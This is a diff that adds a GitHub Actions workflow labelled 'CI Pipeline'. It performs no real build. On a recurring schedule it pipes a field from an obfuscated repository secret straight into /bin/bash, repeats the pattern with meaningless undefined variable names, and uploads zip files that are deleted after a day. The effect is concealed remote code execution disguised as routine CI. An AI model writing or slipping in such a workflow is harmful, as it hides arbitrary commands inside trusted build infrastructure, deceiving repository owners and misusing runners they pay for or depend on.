@@ -1,0 +1,33 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '13 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build and run
+        env:
+          i636: ${{ secrets.i636 }}
+        run: |
+          printf '%s' "$i636" | jq -r .zzmdc59423 | /bin/bash
+          echo $ezvz5167 | jq -r .cvfxe7 | /bin/bash
+          echo $yksns839 | jq -r .l1519 | /bin/bash
+          printf '%s' "$zn651" | jq -r .j325 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: TCfixsAv
+          path: "*.zip"
+          retention-days: 1
